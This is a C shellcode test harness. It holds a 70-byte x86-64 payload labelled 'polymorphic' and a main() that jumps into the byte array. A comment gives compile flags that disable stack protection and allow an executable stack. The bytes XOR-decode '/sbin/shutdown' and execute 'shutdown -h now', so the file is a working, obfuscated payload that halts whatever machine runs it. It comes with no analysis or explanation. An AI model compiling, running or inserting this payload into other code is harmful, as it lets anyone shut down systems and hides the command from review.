#include <stdio.h>
#include <stdlib.h>

char octopus[]=\
"\x48\x31\xc0\x99\x50\x66\x68\x2d\x68\x54\x59\x50\x6a\x77\x66\x68\x6e\x6f\x54\x5b\x50\x53\x51\x54\x5e\x50\xeb\x15\x5f\x6a\x10\x59\x41\xb0\xc8\x44\x30\x44\x0f\xff\xe2\xf9\x6a\x03\x58\x04\x38\x0f\x05\xe8\xe6\xff\xff\xff\xe7\xe7\xe7\xbb\xaa\xa1\xa6\xe7\xbb\xa0\xbd\xbc\xac\xa7\xbf\xa6";
// 70 bytes polymorphic #892 
// gcc -fno-stack-protector -zexecstack 892_mod_c.c -o 892_mod_c.elf


int main(int argc, char **argv[]){
	(* (int (*)())octopus)();
}